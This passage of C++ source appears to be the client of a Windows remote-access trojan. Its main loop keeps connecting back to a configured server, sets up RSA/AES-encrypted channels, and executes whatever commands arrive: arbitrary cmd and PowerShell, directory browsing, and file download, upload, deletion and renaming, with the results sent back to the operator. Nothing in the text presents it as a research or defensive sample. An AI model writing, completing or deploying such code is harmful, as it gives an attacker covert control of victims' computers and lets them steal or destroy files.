    enum Type { JSON_NULL, JSON_OBJECT, JSON_ARRAY, JSON_STRING, JSON_BOOL, JSON_NUMBER };
    Type type;
    std::map<std::string, Json> object_value;
    std::vector<Json> array_value;
    std::string string_value;
    bool bool_value;
    double number_value;

public:
    Json() : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(std::nullptr_t) : type(JSON_NULL), bool_value(false), number_value(0) {}
    Json(const std::string& s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(const char* s) : type(JSON_STRING), string_value(s), bool_value(false), number_value(0) {}
    Json(bool b) : type(JSON_BOOL), bool_value(b), number_value(0) {}
    Json(int n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}
    Json(double n) : type(JSON_NUMBER), number_value(n), bool_value(false) {}

    static Json object() { Json j; j.type = JSON_OBJECT; return j; }
    static Json array() { Json j; j.type = JSON_ARRAY; return j; }

    Json& operator[](const std::string& key) {
        if (type != JSON_OBJECT) { type = JSON_OBJECT; object_value.clear(); }
        return object_value[key];
    }
    void push_back(const Json& val) {
        if (type != JSON_ARRAY) { type = JSON_ARRAY; array_value.clear(); }
        array_value.push_back(val);
    }

    std::string dump(int indent = 0) const {
        if (type == JSON_NULL) return "null";
        if (type == JSON_BOOL) return bool_value ? "true" : "false";
        if (type == JSON_STRING) return "\"" + escape(string_value) + "\"";
        if (type == JSON_NUMBER) {
            char buf[64];
            if (number_value == (int)number_value) snprintf(buf, sizeof(buf), "%d", (int)number_value);
            else snprintf(buf, sizeof(buf), "%g", number_value);
            return std::string(buf);
        }
        if (type == JSON_ARRAY) {
            std::string result = "[";
            for (size_t i = 0; i < array_value.size(); i++) {
                if (i > 0) result += ",";
                if (indent >= 0) result += "\n" + std::string(indent + 2, ' ');
                result += array_value[i].dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !array_value.empty()) result += "\n" + std::string(indent, ' ');
            result += "]";
            return result;
        }
        if (type == JSON_OBJECT) {
            std::string result = "{";
            bool first = true;
            for (const auto& pair : object_value) {
                if (!first) result += ",";
                first = false;
                if (indent >= 0) result += "\n" + std::string(indent + 2, ' ');
                result += "\"" + escape(pair.first) + "\":" + (indent >= 0 ? " " : "");
                result += pair.second.dump(indent >= 0 ? indent + 2 : -1);
            }
            if (indent >= 0 && !object_value.empty()) result += "\n" + std::string(indent, ' ');
            result += "}";
            return result;
        }
        return "null";
    }

private:
    static std::string escape(const std::string& s) {
        std::string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\b') result += "\\b";
            else if (c == '\f') result += "\\f";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); result += buf; }
            else result += c;
        }
        return result;
    }
};

Json browse_directory(const std::string& path) {
    Json result = Json::object();
    try {
        std::string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) actual_path = std::string(home) + actual_path.substr(1);
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = Json(nullptr);
            result["items"] = Json::array();
            return result;
        }

        Json items = Json::array();
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                Json item = Json::object();
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : (double)entry.file_size();
                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() +
                        std::chrono::system_clock::now()));
                std::stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();
                items.push_back(item);
            } catch (...) { continue; }
        }

        result["success"] = true;
        result["current_path"] = actual_path;
        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = Json(nullptr);
        } else if (parent.empty()) {
            result["parent_path"] = Json(nullptr);
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = Json(nullptr);
        result["items"] = Json::array();
    }
    return result;
}


std::vector<uint8_t> execute_command(const std::string& command) {
    std::string trimmed = command;
    size_t start = trimmed.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = trimmed.find_last_not_of(" \t\r\n");
        trimmed = trimmed.substr(start, end - start + 1);
    }
    if (trimmed.empty()) return string_to_vector("[no command]");

    if (trimmed.find("browse:") == 0) {
        std::string browse_path = trimmed.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) browse_path = std::filesystem::current_path().string();
        Json dir_data = browse_directory(browse_path);
        std::string base64_data = Base64::encode(dir_data.dump());
        return string_to_vector("browse-data-" + base64_data);
    }
    if (trimmed.find("download-file:") == 0) {
        std::string filepath = trimmed.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return string_to_vector(download_file(filepath));
    }
    if (trimmed.find("upload-file:") == 0) {
        std::string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != std::string::npos) {
            std::string filepath = rest.substr(0, sep_pos);
            std::string filedata_b64 = rest.substr(sep_pos + 1);
            return string_to_vector(upload_file(filepath, filedata_b64));
        }
        return string_to_vector("ERROR: Invalid upload format");
    }
    if (trimmed.find("delete-file:") == 0) {
        std::string filepath = trimmed.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return string_to_vector(delete_file(filepath));
    }
    if (trimmed.find("rename-file:") == 0) {
        std::string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != std::string::npos) {
            std::string old_path = rest.substr(0, sep_pos);
            std::string new_path = rest.substr(sep_pos + 1);
            return string_to_vector(rename_file(old_path, new_path));
        }
        return string_to_vector("ERROR: Invalid rename format");
    }
    if (trimmed == "ping") return string_to_vector("pong");
    if (trimmed == "exit" || trimmed == "quit" || trimmed == "close") return string_to_vector("exit");

    std::string upper_cmd = trimmed;
    transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);
    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        return string_to_vector(run_powershell_command(trimmed.substr(3)));
    }
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        return string_to_vector(run_powershell_command(trimmed.substr(2)));
    }
    return string_to_vector(run_cmd_command(trimmed));
}


int main() {
    srand(static_cast<unsigned>(time(nullptr)));

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    RSACipher rsa;
    if (!rsa.is_valid()) {

        return 1;
    }

    while (true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) { Sleep(4500); continue; }

        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sock, reinterpret_cast<sockaddr*>(&server_addr), sizeof(server_addr)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(4500);
            continue;
        }


        std::vector<uint8_t> auth_id_bytes(AUTH_ID.begin(), AUTH_ID.end());
        std::vector<uint8_t> enc_auth = rsa.encrypt(auth_id_bytes);
        if (enc_auth.empty()) {
            closesocket(sock);
            Sleep(4500);
            continue;
        }
        send_data(sock, enc_auth);


        std::vector<uint8_t> aes_key(32);
        for (size_t i = 0; i < 32; ++i) aes_key[i] = rand() % 256;
        std::vector<uint8_t> enc_aes_key = rsa.encrypt(aes_key);
        if (enc_aes_key.empty()) {
            closesocket(sock);
            Sleep(4500);
            continue;
        }
        send_data(sock, enc_aes_key);


        AESCipherTCP aes_cipher(aes_key);


        while (true) {
            try {
                auto encrypted_command = recv_data(sock);
                std::string command;
                try {
                    command = aes_cipher.decrypt(encrypted_command);
                } catch (...) {
                    continue;
                }

                command.erase(std::remove(command.begin(), command.end(), '\r'), command.end());

                size_t s = command.find_first_not_of(" \t\r\n");
                if (s != std::string::npos) {
                    size_t e = command.find_last_not_of(" \t\r\n");
                    command = command.substr(s, e - s + 1);
                } else {
                    command.clear();
                }

                if (command.empty()) continue;

                std::string lower = command;
                transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
                if (lower == "exit" || lower == "quit" || lower == "close") break;
                if (lower == "ping") {
                    auto pong_enc = aes_cipher.encrypt("pong");
                    send_data(sock, pong_enc);
                    continue;
                }

                auto output = execute_command(command);
                if (output.empty()) output = string_to_vector("[no output]");
                std::string output_str(output.begin(), output.end());
                if (output_str == "exit") break;

                auto encrypted_output = aes_cipher.encrypt_bytes(output);
                send_data(sock, encrypted_output);
            }
            catch (const std::exception&) {
                break;
            }
        }

        closesocket(sock);
        Sleep(4500);
    }

    WSACleanup();
    return 0;
}
